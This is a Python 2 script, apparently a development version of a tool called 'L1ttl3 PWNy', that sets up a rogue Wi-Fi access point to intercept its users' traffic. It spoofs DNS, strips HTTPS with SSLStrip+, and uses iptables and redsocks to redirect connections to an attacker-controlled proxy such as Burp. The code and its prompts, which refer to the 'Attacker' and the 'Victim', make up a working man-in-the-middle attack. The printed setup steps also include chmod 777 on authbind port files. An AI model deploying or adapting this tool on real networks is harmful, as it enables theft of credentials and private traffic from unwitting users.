#!/usr/bin/python
# _*_ coding: utf-8 _*_

from subprocess import call, check_output, Popen
from time import sleep
from os import urandom, getuid, setpgrp
import random
import string
import signal
import re

#############

# Directory of work [DEVELOPMENT]

homev0 = '/home/tony/Little-PWNy/l1ttl3_pwNY_v0.1/'
homev1 = '/home/tony/Little-PWNy/l1ttl3_pwNY_v1/'

dir_apv0 = homev0 + 'scripts/ap/'

dir_redsocksv0 = homev0 + 'redsocks/'
dir_hostapdv0 = homev0 + 'hostapd/'
dir_dnsmasqv0 = homev0 + 'dnsmasq/'
dir_dns2proxy = homev0 + 'dns2proxy/'
dir_sslstrip2 = homev0 + 'sslstrip2/'

hostapd_confv0 = dir_hostapdv0 + 'hostapd.conf'
hostapd_confv0_pwny = dir_hostapdv0 + 'hostapd_pwny.conf'
hostapd_logv0_pwny = '/var/log/hostapd.log'

dnsmasq_confv0 = dir_dnsmasqv0 + 'dnsmasq.conf'
dnsmasq_confv0_pwny = dir_dnsmasqv0 + 'dnsmasq_pwny.conf'
dnsmasq_hostsv0_pwny = dir_dnsmasqv0 + 'spoof.hosts'
dnsmasq_logv0_pwny = '/var/log/dnsmasq.log'

dns2proxy_confv0 = dir_dns2proxy + 'resolv.conf'
dns2proxy_confv0_victim = dir_dns2proxy + 'victims.cfg'
dns2proxy_confv0_spoof = dir_dns2proxy + 'spoof.cfg'
dns2proxy_confv0_no_spoof = dir_dns2proxy + 'nospoof.cfg'
dns2proxy_confv0_domains = dir_dns2proxy + 'domains.cfg'
dns2proxy_logv0_pwny0 = '/var/log/dns2proxy.log'
dns2proxy_logv0_pwny1 = '/var/log/dns.log'
dns2proxy_logv0_pwny2 = '/var/log/sniff.log'
dns2proxy_logv0_pwny3 = '/var/log/dnsalert.log'

sslstrip_logv0_pwny = '/var/log/dump_ssl.log'

redsocks_confv0 = dir_redsocksv0 + 'redsocks.conf'
redsocks_confv0_pwny = dir_redsocksv0 + 'redsocks_pwny.conf'
redsocks_logv0_pwny = '/var/log/redsocks.log'

iptables_confv0_nat = dir_redsocksv0 + 'rules_nat.v4'
iptables_confv0_filters = dir_redsocksv0 + 'rules_filters.v4'
iptables_confv0_pwny = dir_redsocksv0 + 'rules_pwny.v4'

# RegExs
reg_ip = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
reg_ports = re.compile("^\d{1,5}:(c|r|s4|s5)$")

reg_hostapd_intf = re.compile("^interface")
reg_hostapd_ssid = re.compile("^ssid")
reg_hostapd_passwd = re.compile("^wpa_passphrase")

reg_dnsmasq_dhcp_range = re.compile("^dhcp-range")
reg_dnsmasq_dhcp_option = re.compile("^dhcp-option")

reg_redsocks_log = re.compile("^log=")

reg_iptables_exclude_proxy = re.compile("^-A PREROUTING ! -s IP_PROXY")
reg_iptables_exclude_intf_ap = re.compile("^-A INPUT -i wlan0")

# Data

# known types: socks4, socks5, http-connect, http-relay
proxy_port_type = {'c': 'http-connect', 'r': 'http-relay', 's4': 'socks4', 's5': 'socks5'}


#############


def signal_handler(signal, frame):
	print('\n\tSIGINT received. Exiting\n')
	stop_ap()
	exit(1)


def clear_screen(): print('\033[2J')


def passwd_gen():
	random.seed(urandom(2000))
	x = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(10))
	return x


def check_res_call(res, name_caller):
	if res == 0:
		print("\n\t\t{} Started!".format(name_caller))
	else:
		print("\n\t\t{} Failed to Start!".format(name_caller))
		stop_ap()
		exit(2)


def write_conf_to_file(c_ap):
	# Write AP Conf to file
	hf1 = open('pwny.conf', 'w')

	j = 1
	for k, v in c_ap.iteritems():

		if k == 'serv_dns':
			for i in range(0, len(v)): hf1.write(k + str(i + 1) + ': ' + str(v[i]) + '\n')

		elif k == 'ports_proxy':
			for i in range(0, len(v)): hf1.write(k + str(i + 1) + ': ' + str(v.keys()[i]) + '\n')

		else:
			hf1.write(k + ': ' + str(v) + '\n')

	hf1.close()
	print("\n\t\tConf Written to file 'pwny.conf'")


# TO TEST (100% Complete)
def print_log():
	print("\t\tLogs:\n\t\t{0}\n\t\t{1}\n\t\t{2}\n\t\t{3}\n\t\t{4}\n\t\t{5}\n\t\t{6}".format(
		hostapd_logv0_pwny, dnsmasq_logv0_pwny, redsocks_logv0_pwny, dns2proxy_logv0_pwny1, dns2proxy_logv0_pwny2,
		dns2proxy_logv0_pwny3, sslstrip_logv0_pwny))


# TO TEST (100% Complete)
def get_process_list():
	re_progs = re.compile('(\d.*(hostapd|dnsmasq|redsocks|dns2proxy|sslstrip|sslsniff|bettercap|beef))')
	plist = check_output(["ps", "-ef"])

	ark = re_progs.findall(plist)

	plist = []

	for line in ark: plist.append(line[0])

	return plist


# TO TEST (100% Complete)
def get_iptables_rules(): call(["iptables-save"])


def select_net_interface():
	ifs = check_output(["ls", "/sys/class/net/"])
	ifs = ifs.strip().split('\n')

	for i in range(0, len(ifs)): print("\t\t[{}] {}".format(i, ifs[i]))

	while 1:
		intf = raw_input("\n\t\t[*] ")

		try:
			intf = int(intf)
			if intf >= 0 and intf < len(ifs):
				intf = ifs[intf]
				break
		except:
			print("\t\tWrong Choice!")

	return intf


# TO TEST (80%)
def get_conf_ap():
	# Signals7
	signal.signal(signal.SIGINT, signal_handler)
	###
	#	Variables that will be defined
	#
	#	intf:			Interface used to enbale AP WiFi
	#	ssid:			SSID name broadcasted by AP WiFi
	#	passwd_ap:		Password to get into AP WiFi SSID
	#	ip_ap:			IP of AP
	#	mask_ap:		Subnet IP of AP and SSID Net
	#	dhcp_start_ip:	DHCP Start IP
	#	dhcp_end_ip:	DHCP End IP
	#	dns_ap:			HTTPS Support (dnsmasq, dns2proxy)
	#	https_ap:		HTTPS Support Level (1,2,3)
	#	serv_dns[list]:	DNS Server
	#
	###

	intf, ssid, passwd_ap, ip_ap, mask_ap, dhcp_start_ip, dhcp_end_ip, https_ap, dns_ap = '', '', '', '', '', '', '', '', ''

	### Step_1

	print """
	Configure AP 

	Choose the Interface to enable AP Mode:
	"""

	intf = select_net_interface()

	### Step_2

	print """
	Choose a SSID for you AP (default: 'DEMO-H'). Press ENTER to use default one:
	"""

	while 1:
		ssid = raw_input("\t\t[*] ")

		if ssid == '': ssid = 'DEMO-H'
		if len(ssid) < 32: break
		print("\t\tSSID is too long, write a shorter one")

	### Step_3

	print """
        Choose a Password in order to connect to your AP through SSID (default: 'ap_passWD1')
            Press 1 to have Password Random Generated 
	    Press ENTER to use the Default
            Password should be at least 5 charachters
	"""

	while 1:
		passwd_ap = raw_input("\t\t[*] ")

		if passwd_ap == '1': passwd_ap = passwd_gen()

		if passwd_ap == '': passwd_ap = 'ap_passWD1'

		if len(passwd_ap) >= 5 and len(passwd_ap) <= 40: break

		print("\t\tPassword too long, write a shorter one")

	### Step_4

	print """
        Choose an IP and a Subnet Mask for you AP (default: 10.0.10.1/24).
	"""

	while 1:
		ip_ap = raw_input("\t\t[*] IP: ")
		mask_ap = raw_input("\t\t[*] Mask-Length: ")

		if re.match(reg_ip, ip_ap) and mask_ap != '':

			try:
				mask_ap = int(mask_ap)
				if mask_ap > 0 and mask_ap < 31: break

			except:
				print("\t\tMask-Length not valid!")

		elif not re.match(reg_ip, ip_ap) and ip_ap == '':

			ip_ap = '10.0.10.1'
			mask_ap = 24
			break

		print("\t\tIP or Mask Empty/Wrong")

	### Step_5

	print """
        Choose an IP Range for DHCP Service (default: start: 10.0.10.20 end: 10.0.10.200):
	"""

	while 1:
		dhcp_start_ip = raw_input("\t\t[*] IP Start: ")
		dhcp_end_ip = raw_input("\t\t[*] IP End: ")

		if re.match(reg_ip, dhcp_start_ip) and re.match(reg_ip, dhcp_end_ip):
			try:
				last_oct_s = int(dhcp_start_ip.split('.')[3])
				last_oct_e = int(dhcp_end_ip.split('.')[3])

				if (last_oct_e >= 1 and last_oct_e <= 250) and (
						last_oct_s >= 1 and last_oct_s <= 250) and last_oct_s <= last_oct_e: break

			except:
				pass

		elif dhcp_start_ip == '' or dhcp_end_ip == '':
			dhcp_start_ip = '10.0.10.20'
			dhcp_end_ip = '10.0.10.200'
			break

		print('\t\tRange not valid')

	### Step_6

	print """
        Choose which HTTPS Inspection use your AP (default: 2 - HTTPS):

		[1]	HTTP only:	DISCOVERY MODE. HTTPS traffic will not be broken as we will not intercept it 
				(you can later choose to dump it and decrypted if you have the priv keys of CAs)

			Intercept:	HTTP
			See:		HTTP

		[2] HTTPS:		Require Cert, issued by a CA under your control (self-signed or buyed), installed 
				on Device of Victim (and trusted by the App if Android >= 6).

			Intercept:	HTTP, HTTPS 
			See:		HTTP, HTTPS

		[3] SSLSTRIP+:	Cert not required.

			Intercept:	HTTP
			See:		HTTP, HTTPS

			by original project of Moxie Marlinspike, upgraded by Leonardo Nve
	"""

	# Choose HTTPS Support (dnsmasq or dns2proxy)
	while 1:

		https_ap = raw_input("\t[*] ")

		if https_ap == '2' or https_ap == '':
			https_ap = '2'

			dns_ap = 'dnsmasq'
			break

		elif https_ap == '3':

			dns_ap = 'dns2proxy'

			print("Choose on which interface traffic will exit (default: eth0): ")

			extf = select_net_interface()

			break

		elif https_ap == '1':
			print('Method not implemented yet')
			break

		else:
			print("\t\tWrong choice")

	serv_dns = dns_flow_conf()

	### Step_6

	print("\n\t\tConfirm your configuration and start the AP:\n")
	print("\t\t#\t{}\t\t\tInterface used to enbale AP WiFi".format(intf))
	print("\t\t#\t{}\t\t\tSSID name broadcasted by AP WiFi".format(ssid))
	print("\t\t#\t{}\t\tPassword to get into AP WiFi SSID".format(passwd_ap))
	print("\t\t#\t{}\t\tIP of AP".format(ip_ap))
	print("\t\t#\t{}\t\t\tSubnet IP of AP and SSID Net".format(mask_ap))
	print("\t\t#\t{}\t\tDHCP Start IP".format(dhcp_start_ip))
	print("\t\t#\t{}\t\tDHCP End IP".format(dhcp_end_ip))
	print("\t\t#\t{}\t\t\tHTTPS Support".format(https_ap))
	for i in range(0, len(serv_dns)): print("\t\t#\t{}\t\tDNS Server {}".format(serv_dns[i], i + 1))

	confirm = raw_input("\n\t\t[*] Confirm (y/n): ")

	config_ap = {
		"intf": intf,
		"ssid": ssid,
		"passwd_ap": passwd_ap,
		"ip_ap": ip_ap,
		"mask_ap": str(mask_ap),
		"dhcp_start_ip": dhcp_start_ip,
		"dhcp_end_ip": dhcp_end_ip,
		"dns_ap": dns_ap,
		"serv_dns": serv_dns,  # List as value
	}

	if config_ap['dns_ap'] == 'dns2proxy': config_ap["extf"] = extf

	return confirm, config_ap


# TO TEST (100% Complete)
def dns_flow_conf():
	print """
        Choose which DNS Server you will use (defualt: 1):
		
		[1]	Local Server DNS (AP machine)

		[2]	LAN Server DNS (e.g. Attacker Proxy machine)
	"""

	# Interface where to enable AP Mode
	mode_dns = raw_input("\t\t[*] ")

	if mode_dns == '1' or mode_dns == '': magic_word = 'Upstream'
	if mode_dns == '2': magic_word = 'LAN'

	print """
	Insert the """ + magic_word + """ DNS which will resolve names for you:
	"""

	while 1:
		serv_dns = []
		default = ['208.67.222.222', '208.67.220.220', '8.8.8.8']
		if magic_word == 'Upstream':
			for i in range(0, 3):

				print("\t\tdefault: {}".format(default[i]))

				x = raw_input("\t\t[*] " + magic_word + " DNS Server " + str(i + 1) + ": ")

				if re.match(reg_ip, x):
					serv_dns.append(x)

				elif x == '':
					serv_dns.append(default[i])

		elif magic_word == 'LAN':
			x = raw_input("\t\t[*] " + magic_word + " DNS Server: ")
			if re.match(reg_ip, x): serv_dns.append(x)

		confirm = raw_input("\n\t\tConfirm DNS Servers (y/n)? ")

		if confirm == 'y' or confirm == 'Y': break

	return serv_dns


# TO TEST (100% Complete)
def start_ap(c_ap):
	print("\n\t\tStarting AP...\n")

	# Set AP interface UP
	call(["ip", "link", "set", c_ap['intf'], "up"])
	sleep(5)

	# Build hostapd Conf File
	# Keys to change:
	#	interface
	#	ssid
	#	wpa_passphrase
	print("\t\tBuilding hostapd conf")

	hf1 = open(hostapd_confv0_pwny, 'w')

	with open(hostapd_confv0, 'r') as hf:
		for line in hf:
			if re.match(reg_hostapd_intf, line):
				line = re.sub("wlan0", c_ap['intf'], line)
			elif re.match(reg_hostapd_ssid, line):
				line = re.sub("DEMO-H", c_ap['ssid'], line)
			elif re.match(reg_hostapd_passwd, line):
				line = re.sub("art01KL!", c_ap['passwd_ap'], line)

			hf1.write(line)
		hf1.close()

	print("\t\tStarting hostapd")
	res = call(["hostapd", "-e", "/dev/urandom", "-B", hostapd_confv0_pwny, "-f", hostapd_logv0_pwny])
	sleep(5)
	check_res_call(res, 'hostpad')

	print("\t\tSet IP {} on AP".format(c_ap['ip_ap']))
	call(["ip", "addr", "add", c_ap['ip_ap'] + '/' + c_ap['mask_ap'], "dev", c_ap['intf']])
	sleep(5)

	# Build dnsmasq Conf File
	# Keys that change:
	#	server	{1,3}	# only for https_ap 1,2
	#	interface
	#	dhcp-range
	#	dhcp-option {2}

	### DNS CONF ###

	print("\t\tBuilding dnsmasq conf")

	hf1 = open(dnsmasq_confv0_pwny, 'w')

	# Write DNS Server
	if c_ap['dns_ap'] == 'dnsmasq':
		for line in c_ap['serv_dns']: hf1.write('server=' + line + "\n")
		hf1.write('no-resolv' + "\n")
		hf1.write('no-hosts' + "\n")
		hf1.write('addn-hosts=' + dnsmasq_hostsv0_pwny + "\n")

	# Disable DNS with dnsmasq and write DNS conf for dns2proxy
	elif c_ap['dns_ap'] == 'dns2proxy':
		hf1.write('port=0' + "\n")
		with open(dns2proxy_confv0, 'w') as hf:
			for line in c_ap['serv_dns']: hf.write('nameserver ' + line + "\n")

	### DHCP CONF ###
	with open(dnsmasq_confv0, 'r') as hf:

		# Write Interface and DHCP Server
		for line in hf:

			if re.match(reg_hostapd_intf, line):
				line = line = re.sub("wlan0", c_ap['intf'], line)

			elif re.match(reg_dnsmasq_dhcp_range, line):
				line = re.sub('10.0.10.10', c_ap['dhcp_start_ip'], line)
				line = re.sub('10.0.10.250', c_ap['dhcp_end_ip'], line)

			elif re.match(reg_dnsmasq_dhcp_option, line):
				line = re.sub('10.0.10.1', c_ap['ip_ap'], line)

			hf1.write(line)
		hf1.close()

	print("\t\tStarting DHCP + DNS Server")
	res = call(["dnsmasq", "-C", dnsmasq_confv0_pwny, "-8", dnsmasq_logv0_pwny])
	sleep(5)
	check_res_call(res, 'dnsmasq')

	if c_ap['dns_ap'] == 'dns2proxy':
		res = Popen(['nohup', dir_dns2proxy + "dns2proxy", "-i", c_ap['intf']],
					preexec_fn=setpgrp
					)
		sleep(5)
	# check_res_call(res, 'dns2proxy')

	return


# TO TEST (80%)
def start_interception(c_ap):
	###
	#	Variables that will be defined
	#
	#	ip_proxy:			Interface used to enbale AP WiFi
	#	ports_proxy [list]:	SSID name broadcasted by AP WiFi
	#	virtual_phy [dict]:	Association physical_port:virtual_port (e.g. 443: 8090, 443:8091, etc.)
	#
	###

	print """		
	Attacker Settings:
		
		IP Proxy (Attacker):        e.g. 10.0.10.161
	
		Port to Sniff:              e.g. 80:r, 443:c, 5228:c
			
		Type of proxy for port		
				
			c:	http-connect (SSL Proxy)
			r:	http-relay	(HTTP traffic)
			s4:	socksv4 Proxy
			s5:	socksv5 Proxy
	"""

	while 1:
		ip_proxy = raw_input("\t\t[*] Proxy IP: ")

		ports_proxy = raw_input("\t\t[*] Sniff Ports (followed by type - c,r,s4,s5): ")
		ports_proxy = str(ports_proxy).split(',')

		# Check IP
		if re.match(reg_ip, ip_proxy):
			# Check Ports
			pvr = False
			for port in ports_proxy:
				if not re.match(reg_ports, port): pvr = True

			if not pvr: break

		print("\t\tWrong IP or Ports")

	# Build redsocks Conf File

	# Keys to change:
	#	log

	# Keys to add:
	#	local_ip = 0.0.0.0
	#	local_port = 8090	#incremental
	#	ip = #ip_proxy
	#	port = #port
	#	type = #proxy_type	
	print("\t\tBuilding redsocks conf")

	hf1 = open(redsocks_confv0_pwny, 'w')

	with open(redsocks_confv0, 'r') as hf:
		for line in hf:
			if re.match(reg_redsocks_log, line.strip()): line = re.sub('LOG_LOCATION', redsocks_logv0_pwny, line)
			hf1.write(line)

	virtual_phy = {}
	virtual_port = 8090
	for i in range(0, len(ports_proxy)):
		port = ports_proxy[i].split(':')

		ptype = port[1]
		port = port[0]

		# Port 80 hooked by sslstrip2 if you use dns2proxy
		if c_ap['dns_ap'] == 'dnsmasq' or (c_ap['dns_ap'] == 'dns2proxy' and port != '80'):
			proxy_conf = "redsocks{\n\tlocal_ip=0.0.0.0;\n\tlocal_port=" + str(virtual_port) + ";\n\t"
			proxy_conf += "ip=" + ip_proxy + ";\n\tport=" + port + ";\n\ttype=" + proxy_port_type[ptype] + ";\n}\n"
			hf1.write(proxy_conf)

		# Association 'virtual_port' and 'port'. Used later to conf iptables
		virtual_phy[port] = str(virtual_port)

		virtual_port += 1

	hf1.close()

	# Build iptables Conf File

	# Keys to change:
	#	IP_PROXY
	#	intf

	# Keys to add:
	#	NAT:
	#		-A REDSOCK for each pair of port (see virtual_phy)
	#	FILTER:
	#		-A INPUT for each virtual port (see virtual_phy)

	print("\t\tBuilding iptables conf")

	hf1 = open(iptables_confv0_pwny, 'w')

	# Parse NAT rules
	with open(iptables_confv0_nat, 'r') as hf:
		for line in hf:
			if re.match(reg_iptables_exclude_proxy, line):
				line = re.sub('IP_PROXY', ip_proxy, line)
				line = re.sub('wlan0', c_ap['intf'], line)

			hf1.write(line)

	# Write NAT rules
	for k in virtual_phy: hf1.write("-A REDSOCKS -p tcp -m tcp --dport " + k + " -j REDIRECT --to-ports " + virtual_phy[k] + "\n")

	if c_ap['dns_ap'] == 'dns2proxy': hf1.write("-A POSTROUTING -o "+c_ap['extf']+" -j MASQUERADE\n")

	hf1.write("COMMIT\n")

	# Parse FILTER rules
	with open(iptables_confv0_filters, 'r') as hf:
		for line in hf:

			if re.match(reg_iptables_exclude_intf_ap, line): line = re.sub('wlan0', c_ap['intf'], line)

			hf1.write(line)

	# Write FILTER rules
	for k in virtual_phy: hf1.write("-A INPUT -p tcp -m tcp --dport " + virtual_phy[k] + " -j ACCEPT" + '\n')

	hf1.write("COMMIT\n")

	hf1.close()

	print("\t\tLoading iptables rules")

	print iptables_confv0_pwny

	# Load iptables rules
	res = call(["iptables-restore", iptables_confv0_pwny])
	sleep(2)
	check_res_call(res, 'iptables-restore')

	print("\n\tIptables rules loaded correctly !")

	print("\n\tStarting RedSockS...")

	# Start Redsocks
	res = call(["redsocks", "-c", redsocks_confv0_pwny])
	check_res_call(res, 'redsocks')

	print("\n\tRedSockS Started Succesfully!")

	c_ap['ip_proxy'] = ip_proxy
	c_ap['ports_proxy'] = virtual_phy

	# Start SSLStrip+
	if c_ap['dns_ap'] == 'dns2proxy':
		print("\n\tStarting SSLStrip+ ...")
		res = Popen(['nohup', dir_sslstrip2 + "sslstrip.py", "-a", "-l", virtual_phy['80'], "-w", sslstrip_logv0_pwny],
					preexec_fn=setpgrp
					)
		sleep(2)
		return c_ap

	# Print Instruction per attaccante
	print """
	LOCAL PROXY INSTRUCTION
		
	This are just some instruction to use on Attacker Machine, where Proxy resides
		
	Use "authbind" to open a socket on weel-known port for your proxy
	
        You can use Burp Suite as Proxy. It is able to Intercept HTTP/HTTPS traffic and you can modify this live.
        link: https://portswigger.net/burp/communitydownload

        You need to configure it first

		sudo apt-get update
		sudo apt-get install authbind
		
		sudo touch /etc/authbind/byport/80
		sudo touch /etc/authbind/byport/443
		sudo chmod 777 /etc/authbind/byport/80
		sudo chmod 777 /etc/authbind/byport/443
			
        Then You can start is as in this example

		authbind --deep java -jar burpsuite_community_1.7.33.jar
	      
	You should add al well-known (0-1024) ports needed at authbind

	Set Your Proxy to listen on all ports you configured
	Take a look on 'pwny.conf' for details
	If you use Burp Proxy you should put all ports on Invisible Mode
	      
	e.g.
		Burp Listener port 80   (Invisible)
		Burp Listener port 443  (Invisible)	{http-connect}

		Burp Listener port 5094 (Invisible)	{http-connect}	[GMS]
		Burp Listener port 5228 (Invisible)	{http-connect}	[mtalk Google]
		Burp Listener port 8080
	"""

	raw_input('\t\t[*] Press any key to continue')

	return c_ap


# TO TEST (100% Complete)
def status_ap():
	# Status AP
	get_iptables_rules()


# TO TEST (100% Complete)
def stop_ap():
	print("\n\t\tKilling AP...")
	call(["killall", "redsocks"])
	call(["killall", "dnsmasq"])
	call(["killall", "dns2proxy"])
	call(["killall", "hostapd"])
	call(["killall", "sslstrip.py"])
	call([dir_apv0 + 'clean_iptables.sh'])


# TO TEST (80%)
def main():
	# Signals
	signal.signal(signal.SIGINT, signal_handler)

	if getuid() != 0:
		print("\nYou need to be root in order to execute the script")
		exit(1)

	# clear_screen()
	print """
	        	
		Auto Conf L1ttl3 PWNy v0.1
		
	"""

	print """
	Choose Implementation

		[1]      L1ttl3 PwnYv0.1 (RedSocks)
		[2]      L1ttl3 PwnYv1 (Bettercap) [Not Implemented Yet]
	"""

	ver = raw_input("\t\t[*] ")

	if ver == '1':

		while 1:

			# Get Conf for AP (IP, Subnet, DHCP, DNS)
			confirm, config_ap = get_conf_ap()

			if confirm == 'y' or confirm == 'Y': break

			clear_screen()

		# Write PWNy Conf to file
		write_conf_to_file(config_ap)

		# Kill AP if already running
		stop_ap()

		# Start AP with Conf taken in get_conf_ap()
		start_ap(config_ap)

		# Status AP
		status_ap()

		print("\t\tUse the configuration at 'pwny.conf' to connect to your AP")
		confirm = raw_input("\t\tDo you want to print the content of 'pwny.conf' here (y/n) ?")

		if confirm == 'y' or confirm == 'Y':
			with open('pwny.conf', 'r') as hf:
				for line in hf: print("\t\t\t{}".format(line))

		# Start Interception of traffic
		confirm = raw_input("\n\t\tDo you want to start intereption of traffic via a Proxy under your control (y/n)?")

		if confirm == 'y' or confirm == 'Y':

			config_ap = start_interception(config_ap)

		else:
			exit(1)

		# Write PWNy Conf to file
		write_conf_to_file(config_ap)

		# Status AP
		status_ap()

		# Show log location for monitoring
		print_log()


	elif ver == '2':
		print("\t\tMethod not implemented");
		exit(0)
	else:
		print("\t\tWrong choice. Exiting!");
		exit(1)

	exit(0)


if __name__ == "__main__": main()
